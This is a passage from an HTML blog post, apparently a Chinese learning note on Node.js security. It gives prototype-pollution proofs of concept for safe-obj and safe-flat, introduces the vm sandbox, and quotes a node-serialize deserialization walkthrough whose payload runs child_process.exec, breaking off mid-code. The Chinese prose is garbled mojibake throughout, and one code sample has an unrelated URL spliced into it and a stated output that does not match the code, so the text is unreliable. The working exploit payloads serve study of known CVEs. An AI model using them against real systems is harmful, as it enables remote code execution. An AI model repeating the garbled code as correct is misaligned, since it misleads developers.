class="attr">prop2</span>: &#123;</span><br><span class="line">      <span class="attr">prop3</span>: <span class="string">&#x27;value&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨safeObj.getæ–¹æ³•è·å–æ·±å±‚å¯¹è±¡çš„å±æ€§</span></span><br><span class="line"><span class="keyword">const</span> prop3Value = safeObj.<span class="title function_">get</span>(obj, <span class="string">&#x27;prop1.prop2.prop3&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(prop3Value); <span class="comment">// è¾“å‡º: &#x27;value&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨safeObj.hasæ–¹æ³•æ£€æŸ¥æ·±å±‚å¯¹è±¡çš„å±æ€§æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="keyword">const</span> hasProp3 = safeObj.<span class="title function_">has</span>(obj, <span class="string">&#x27;prop1.prop2.prop3&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hasProp3); <span class="comment">// è¾“å‡º: true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨safeObj.getOrDefaultæ–¹æ³•è·å–æ·±å±‚å¯¹è±¡çš„å±æ€§ï¼Œå¦‚æœå±æ€§ä¸å­˜åœ¨åˆ™è¿”å›é»˜è®¤å€¼</span></span><br><span class="line"><span class="keyword">const</span> defaultValue = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> prop4Value = safeObj.<span class="title function_">getOrDefault</span>(obj, <span class="string">&#x27;prop1.prop2.prop4&#x27;</span>, defaultValue);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(prop4Value); <span class="comment">// è¾“å‡º: &#x27;default&#x27;</span></span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25928">CVE-2021-25928</a></p><p>POCï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> safeObj = <span class="built_in">require</span>(<span class="string">&quot;safe-obj&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br><span class="line">safeObj.<span class="title function_">expand</span>(obj, <span class="string">&#x27;__proto__.polluted&#x27;</span>, <span class="string">&#x27;Yes! Its Polluted&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure><h3 id="safe-flatåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25927ï¼‰"><a href="#safe-flatåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25927ï¼‰" class="headerlink" title="safe-flatåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25927ï¼‰"></a>safe-flatåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25927ï¼‰</h3><p>safe-flatæ¨¡å—æ˜¯ä¸€ä¸ªJavaScriptæ¨¡å—ï¼Œç”¨äºå®‰å…¨åœ°å±•å¹³ï¼ˆflattenï¼‰åµŒå¥—çš„å¯¹è±¡æˆ–æ•°ç»„ã€‚åœ¨JavaScriptä¸­ï¼Œå±•å¹³å¯¹è±¡æˆ–æ•°ç»„æ˜¯æŒ‡å°†å¤šå±‚åµŒå¥—çš„ç»“æ„è½¬æ¢ä¸ºå•å±‚çš„é”®å€¼å¯¹å½¢å¼ï¼Œæ–¹ä¾¿è¿›è¡Œéå†å’Œå¤„ç†ã€‚safe-flatæ¨¡å—æä¾›äº†ä¸€ç§å®‰å…¨çš„æ–¹å¼æ¥å±•å¹³å¯¹è±¡æˆ–æ•°ç»„ï¼Œä»¥é˜²æ­¢æ½œåœ¨çš„å®‰å…¨æ¼æ´å’Œæ„å¤–è¡Œä¸ºã€‚</p><p>è¯¥æ¨¡å—çš„å…·ä½“åŠŸèƒ½åŒ…æ‹¬ï¼š</p><blockquote><ol><li>å®‰å…¨å±•å¹³å¯¹è±¡ï¼šsafe-flatæ¨¡å—æä¾›äº†ä¸€ä¸ª<code>flattenObject</code>æ–¹æ³•ï¼Œå¯ä»¥å®‰å…¨åœ°å±•å¹³åµŒå¥—çš„å¯¹è±¡ã€‚è¯¥æ–¹æ³•ä¼šé€’å½’éå†å¯¹è±¡çš„å±æ€§ï¼Œå¹¶å°†æ¯ä¸ªå±æ€§çš„é”®å€¼å¯¹æ·»åŠ åˆ°å±•å¹³åçš„ç»“æœä¸­ã€‚</li><li>å®‰å…¨å±•å¹³æ•°ç»„ï¼šsafe-flatæ¨¡å—è¿˜æä¾›äº†ä¸€ä¸ª<code>flattenArray</code>æ–¹æ³•ï¼Œå¯ä»¥å®‰å…¨åœ°å±•å¹³åµŒå¥—çš„æ•°ç»„ã€‚è¯¥æ–¹æ³•ä¼šé€’å½’éå†æ•°ç»„çš„å…ƒç´ ï¼Œå¹¶å°†æ¯ä¸ªå…ƒç´ æ·»åŠ åˆ°å±•å¹³åçš„ç»“æœä¸­ã€‚</li></ol></blockquote><p>ä½¿ç”¨safe-flatæ¨¡å—å¯ä»¥å¸®åŠ©å¼€å‘è€…åœ¨å¤„ç†åµŒå¥—çš„å¯¹è±¡æˆ–æ•°ç»„æ—¶æ›´åŠ å®‰å…¨å’Œæ–¹ä¾¿ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨safe-flatæ¨¡å—å®‰å…¨åœ°å±•å¹³åµŒå¥—çš„å¯¹è±¡å’Œæ•°ç»„</span></span><br><span class="line"><span class="keyword">const</span> safeFlat = <span class="built_in">require</span>(<span class="string">&#x27;safe-flat&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nestedObject = &#123;</span><br><span class="line">  <span class="attr">prop1</span>: &#123;</span><br><span class="line">    <span class="attr">prop2</span>: &#123;</span><br><span class="line">      <span class="attr">prop3</span>: <span class="string">&#x27;value&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨safeFlat.flattenObjectæ–¹æ³•å±•å¹³åµŒå¥—çš„å¯¹è±¡</span></span><br><span class="line"><span class="keyword">const</span> flattenedObject = safeFlat.<span class="title function_">flattenObject</span>(nestedObject);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(flattenedObject);</span><br><span class="line"><span class="comment">// è¾“å‡º: &#123; &#x27;prop1.prop2.prop3&#x27;: &#x27;value&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nestedArray = [<span class="number">1</span>, [<span class="number">2</span>, [<span class="number">3</span>, [[<span class="number">1</span>]](<span class="attr">https</span>:<span class="comment">//www.seal-analytical.com/zh/%E4%BA%A7%E5%93%81/%E6%B6%88%E8%A7%A3%E4%BB%AA/DEENA-II-%E9%87%91%E5%B1%9E%E6%B6%88%E8%A7%A3%E6%A8%A1%E5%9D%97)]]];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨safeFlat.flattenArrayæ–¹æ³•å±•å¹³åµŒå¥—çš„æ•°ç»„</span></span><br><span class="line"><span class="keyword">const</span> flattenedArray = safeFlat.<span class="title function_">flattenArray</span>(nestedArray);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(flattenedArray);</span><br><span class="line"><span class="comment">// è¾“å‡º: [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25927">CVE-2021-25927</a></p><p>è¯¥æ¼æ´å­˜åœ¨äºsafe-flatï¼Œv2.0.0~v2.0.1ç‰ˆæœ¬ä¸­ï¼ŒPOCå¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> safeFlat = <span class="built_in">require</span>(<span class="string">&quot;safe-flat&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br><span class="line">safeFlat.<span class="title function_">unflatten</span>(&#123;<span class="string">&quot;__proto__.polluted&quot;</span>: <span class="string">&quot;Yes! Its Polluted&quot;</span>&#125;, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure><hr><p>Learn more:</p><ol><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10809">åˆæ¢node.jsç›¸å…³ä¹‹åŸå‹é“¾æ±¡æŸ“ - å…ˆçŸ¥ç¤¾åŒº</a></li><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10032">è°­è°ˆ Javascript åŸå‹é“¾ä¸åŸå‹é“¾æ±¡æŸ“ - å…ˆçŸ¥ç¤¾åŒº</a></li><li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7198068207499706428">NodejsåŸå‹é“¾æ±¡æŸ“ - æ˜é‡‘</a></li></ol><hr><h2 id="vmæ˜¯å•¥ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ"><a href="#vmæ˜¯å•¥ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ" class="headerlink" title="vmæ˜¯å•¥ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ"></a>vmæ˜¯å•¥ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</h2><p>VMï¼ˆVirtual Machineï¼‰æ˜¯æŒ‡ä¸€ç§è¿è¡Œåœ¨ JavaScript ç¯å¢ƒä¸­çš„è™šæ‹Ÿæœºã€‚Node.js æä¾›äº†ä¸€ä¸ªåä¸º <code>vm</code> çš„å†…ç½®æ¨¡å—ï¼Œç”¨äºåˆ›å»ºå’Œè¿è¡Œ JavaScript ä»£ç çš„éš”ç¦»ç¯å¢ƒã€‚</p><p>é€šè¿‡ <code>vm</code> æ¨¡å—ï¼Œä½ å¯ä»¥åœ¨ Node.js ä¸­åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿæœºå®ä¾‹ï¼Œå¹¶åœ¨è¯¥å®ä¾‹ä¸­æ‰§è¡Œ JavaScript ä»£ç ã€‚è¿™ä¸ªè™šæ‹Ÿæœºå®ä¾‹ä¸ä¸» Node.js è¿›ç¨‹å’Œå…¶ä»–è™šæ‹Ÿæœºå®ä¾‹æ˜¯éš”ç¦»çš„ï¼Œå®ƒæ‹¥æœ‰è‡ªå·±çš„å…¨å±€å¯¹è±¡ã€æ¨¡å—ç³»ç»Ÿå’Œæ‰§è¡Œç¯å¢ƒã€‚</p><p>ä½¿ç”¨ VM å¯ä»¥å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ol><li><strong>éš”ç¦»æ‰§è¡Œç¯å¢ƒ</strong>: VM å…è®¸ä½ åœ¨ä¸€ä¸ªç‹¬ç«‹çš„ç¯å¢ƒä¸­æ‰§è¡Œ JavaScript ä»£ç ï¼Œä¸ä¸»è¿›ç¨‹çš„ç¯å¢ƒç›¸äº’éš”ç¦»ã€‚è¿™å¯ä»¥é˜²æ­¢ä»£ç ä¹‹é—´çš„å†²çªå’Œå¹²æ‰°ï¼Œç‰¹åˆ«æ˜¯åœ¨åŠ è½½å’Œè¿è¡Œä¸å—ä¿¡ä»»çš„ä»£ç æ—¶æ›´åŠ å®‰å…¨ã€‚</li><li><strong>åŠ¨æ€ä»£ç æ‰§è¡Œ</strong>: VM å…è®¸ä½ åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°å°†å­—ç¬¦ä¸²å½¢å¼çš„ JavaScript ä»£ç ç¼–è¯‘å’Œæ‰§è¡Œï¼Œè€Œä¸éœ€è¦ä¾èµ–å¤–éƒ¨æ–‡ä»¶æˆ–æ¨¡å—ã€‚è¿™å¯¹äºåŠ¨æ€ç”Ÿæˆä»£ç ã€æ’ä»¶ç³»ç»Ÿä»¥åŠåŠ¨æ€æ‰§è¡Œç”¨æˆ·æä¾›çš„ä»£ç éå¸¸æœ‰ç”¨ã€‚</li><li><strong>æ²™ç›’ç¯å¢ƒ</strong>: VM å¯ä»¥ç”¨æ¥åˆ›å»ºæ²™ç›’ç¯å¢ƒï¼Œé™åˆ¶ä»£ç çš„è®¿é—®æƒé™å’ŒåŠŸèƒ½ï¼Œä»¥æä¾›æ›´é«˜çš„å®‰å…¨æ€§ã€‚ä½ å¯ä»¥é€šè¿‡æ§åˆ¶ VM å®ä¾‹çš„ä¸Šä¸‹æ–‡å’Œå…¨å±€å¯¹è±¡æ¥é™åˆ¶ä»£ç å¯¹ç³»ç»Ÿèµ„æºå’Œæ•æ„Ÿæ“ä½œçš„è®¿é—®ã€‚</li></ol><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ Node.js ä¸­çš„ VM æ¨¡å—åˆ›å»ºå’Œæ‰§è¡Œä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">  const message = &#x27;Hello, world!&#x27;;</span></span><br><span class="line"><span class="string">  console.log(message);</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">  <span class="attr">console</span>: <span class="variable language_">console</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(code);</span><br><span class="line"><span class="keyword">const</span> compiledCode = script.<span class="title function_">runInNewContext</span>(context);</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>vm</code> æ¨¡å—åˆ›å»ºäº†ä¸€ä¸ª VM å®ä¾‹ï¼Œå¹¶æä¾›äº†ä¸€ä¸ª JavaScript ä»£ç å­—ç¬¦ä¸²ã€‚ç„¶åï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ <code>context</code>ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ª <code>console</code> å¯¹è±¡ï¼Œä»¥ä¾¿åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¯ä»¥è¾“å‡ºæ—¥å¿—ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>vm.Script</code> æ„é€ å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªè„šæœ¬å¯¹è±¡ï¼Œå¹¶è°ƒç”¨ <code>runInNewContext</code> æ–¹æ³•åœ¨æŒ‡å®šçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç ã€‚</p><p><a target="_blank" rel="noopener" href="https://0xgeekcat.github.io/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3Node.js%E6%B2%99%E7%AE%B1%E7%8E%AF%E5%A2%83%E5%B9%B6%E5%88%86%E6%9E%90VM2%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.html">ç®€å•äº†è§£Node.jsæ²™ç®±ç¯å¢ƒå¹¶åˆ†æVM2å®ç°åŸç†</a></p><h2 id="vmæ²™ç®±é€ƒé€¸"><a href="#vmæ²™ç®±é€ƒé€¸" class="headerlink" title="vmæ²™ç®±é€ƒé€¸"></a>vmæ²™ç®±é€ƒé€¸</h2><p>æˆ‘çš„nodeç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œæœ‰æ—¶é—´åˆä¿®æ”¹ã€‚</p><p><a target="_blank" rel="noopener" href="https://la2y_fish.gitee.io/blog/2023/10/04/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89/#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">vmæ²™ç®±é€ƒé€¸</a></p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/16899212.html">vmæ²™ç®±é€ƒé€¸å®¡è®¡</a></p><h2 id="node-serializeååºåˆ—åŒ–RCEæ¼æ´-CVE-2017-5941"><a href="#node-serializeååºåˆ—åŒ–RCEæ¼æ´-CVE-2017-5941" class="headerlink" title="node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941)"></a>node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941)</h2><p>ä»¥ä¸‹å†…å®¹ä¸º<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1374840">CVE-2017-5941: åˆ©ç”¨Node.jsååºåˆ—åŒ–æ¼æ´æ‰§è¡Œè¿œç¨‹ä»£ç </a>å¼•ç”¨ï¼ˆå› ä¸ºæˆ‘æ‡’äº†ï¼Œå¦‚æœ‰å†’çŠ¯ï¼Œè”ç³»ç«‹åˆ </p><p>è‹¥ä¸å¯ä¿¡çš„æ•°æ®ä¼ å…¥ <code>unserialize()</code> å‡½æ•°ï¼Œé€šè¿‡ä¼ é€’ç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼ˆIIFEï¼‰çš„ JavaScript å¯¹è±¡å¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><h3 id="æ¼æ´è¯¦æƒ…"><a href="#æ¼æ´è¯¦æƒ…" class="headerlink" title="æ¼æ´è¯¦æƒ…"></a>æ¼æ´è¯¦æƒ…</h3><p>å®¡è®¡ Node.js ä»£ç æ—¶ï¼Œæˆ‘æ­£å¥½çœ‹åˆ°ä¸€ä¸ªåä¸º node-serialize çš„åºåˆ—å·&#x2F;ååºåˆ—åŒ–æ¨¡å—ã€‚ä¸‹é¢æ˜¯ä¸€æ®µä»£ç ç¤ºä¾‹ï¼Œæ¥è‡ªç½‘ç»œè¯·æ±‚çš„ cookie ä¼šä¼ é€’åˆ°è¯¥æ¨¡å—çš„ unserialize() å‡½æ•°ä¸­ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> <span class="built_in">escape</span> = <span class="built_in">require</span>(<span class="string">&#x27;escape-html&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();  </span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;  </span><br><span class="line"> <span class="keyword">if</span> (req.<span class="property">cookies</span>.<span class="property">profile</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">Buffer</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>, <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">   <span class="keyword">var</span> obj = serialize.<span class="title function_">unserialize</span>(str);</span><br><span class="line">   <span class="keyword">if</span> (obj.<span class="property">username</span>) &#123;</span><br><span class="line">     res.<span class="title function_">send</span>(<span class="string">&quot;Hello &quot;</span> + <span class="built_in">escape</span>(obj.<span class="property">username</span>));</span><br><span class="line">   &#125;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     res.<span class="title function_">cookie</span>(<span class="string">&#x27;profile&#x27;</span>, <span class="string">&quot;eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=&quot;</span>, &#123;</span><br><span class="line">       <span class="attr">maxAge</span>: <span class="number">900000</span>,</span><br><span class="line">       <span class="attr">httpOnly</span>: <span class="literal">true</span></span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"> res.<span class="title function_">send</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);  </span><br></pre></td></tr></table></figure><p>Javaï¼ŒPHPï¼ŒRuby å’Œ Python éƒ½å‡ºç°è¿‡å¾ˆå¤šæ¬¡ååºåˆ—åŒ–çš„æ¼æ´ã€‚ä¸‹é¢æ˜¯è¿™äº›é—®é¢˜çš„ç›¸å…³èµ„æºï¼š</p><ul><li><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://securitycafe.ro/2015/01/05/understanding-php-object-injection/">Understanding PHP Object Injection</a></li><li><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet">Java Deserialization Cheat Sheet</a></li><li><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/">Rails Remote Code Execution Vulnerability Explained</a></li><li><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.cs.uic.edu/~s/musings/pickle/">Arbitrary code execution with Python pickles</a></li></ul><p>ä½†æ˜¯æˆ‘æ‰¾ä¸åˆ°ä»»ä½•å…³äº Node.js ä¸­ååºåˆ—å·&#x2F;å¯¹è±¡æ³¨å…¥çš„èµ„æºï¼Œäºæ˜¯æˆ‘å°±æƒ³å¯¹æ­¤è¿›è¡Œç ”ç©¶ï¼Œç„¶åæˆ‘èŠ±äº†ç‚¹å„¿æ—¶é—´æˆåŠŸåˆ©ç”¨æ­¤ bugï¼Œå®ç°äº†ä»»æ„ä»£ç æ³¨å…¥ã€‚</p><h3 id="æ„å»º-Payload"><a href="#æ„å»º-Payload" class="headerlink" title="æ„å»º Payload"></a>æ„å»º Payload</h3><p>æˆ‘ä½¿ç”¨äº† 0.0.4 ç‰ˆæœ¬çš„ node-serialize è¿›è¡Œç ”ç©¶ï¼ŒæˆåŠŸåˆ©ç”¨çš„è¯ï¼Œä¸å¯ä¿¡è¾“å…¥ä¼ é€’åˆ° <code>unserialize()</code> çš„æ—¶å€™å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚åˆ›å»º payload æœ€å¥½ä½¿ç”¨åŒä¸€æ¨¡å—çš„ <code>serialize()</code> å‡½æ•°ã€‚</p><p>æˆ‘åˆ›å»ºäº†ä»¥ä¸‹ JavaScript å¯¹è±¡ï¼Œå°†å…¶ä¼ å…¥ <code>serialize()</code> å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;  </span><br><span class="line"> rce : <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls /&#x27;</span>, <span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(stdout) &#125;);</span><br><span class="line"> &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);  </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Serialized: \n&quot;</span> + serialize.<span class="title function_">serialize</span>(y));  </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¾—åˆ°ä»¥ä¸‹è¾“å‡ºï¼š</p><img src="/img/loading.gif" data-original="/blog/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/3.png" title="wuhu"><p>ç°åœ¨æˆ‘ä»¬å¾—åˆ°åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç”¨ <code>unserialize()</code> å‡½æ•°è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆä»£ç æ‰§è¡Œå‘¢ï¼Ÿåªæœ‰è§¦å‘å¯¹è±¡çš„ rce æˆå‘˜å‡½æ•°æ‰è¡Œã€‚</p><p>åæ¥æˆ‘æƒ³åˆ°å¯ä»¥ä½¿ç”¨ JavaScript çš„ç«‹å³è°ƒç”¨çš„å‡½æ•°è¡¨è¾¾å¼ï¼ˆIIFEï¼‰æ¥è°ƒç”¨è¯¥å‡½æ•°ã€‚å¦‚æœæˆ‘ä»¬åœ¨å‡½æ•°åä½¿ç”¨ IIFE æ‹¬å· <code>()</code> ï¼Œåœ¨å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œå‡½æ•°å°±ä¼šé©¬ä¸Šè¢«è°ƒç”¨ã€‚æœ‰ç‚¹ç±»ä¼¼äº C ä¸­çš„ç±»æ„é€ å‡½æ•°ã€‚</p><p>ç°åœ¨ä¿®æ”¹è¿‡çš„ä»£ç ç» <code>serialize()</code> å‡½æ•°é©¬ä¸Šä¼šè¢«è°ƒç”¨ã€‚</p><img src="/img/loading.gif" data-original="/blog/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/4.png" title="wuhu"><p>IIFE è¿è¡Œè‰¯å¥½ï¼Œä½†åºåˆ—åŒ–å¤±è´¥äº†ã€‚äºæ˜¯æˆ‘è¯•ç€åœ¨ä¹‹å‰åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­å‡½æ•°ä½“åé¢åŠ ä¸Šæ‹¬å· <code>()</code>ï¼Œå¹¶å°†å…¶ä¼ å…¥ <code>unserialize()</code> å‡½æ•°ï¼Œå¾ˆå¹¸è¿ï¼ŒæˆåŠŸæ‰§è¡Œã€‚é‚£ä¹ˆå°±æœ‰äº†ä¸‹é¢çš„ exploitï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;rce&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_function ()&#123;\n \t require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,</span></span><br><span class="line"><span class="string">function(error, stdout, stderr) &#123; console.log(stdout) &#125;);\n &#125;()&quot;</span>&#125;  </span><br></pre></td></tr></table></figure><p>å°†å…¶ä¼ å…¥ <code>unserialize()</code> å‡½æ•°ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 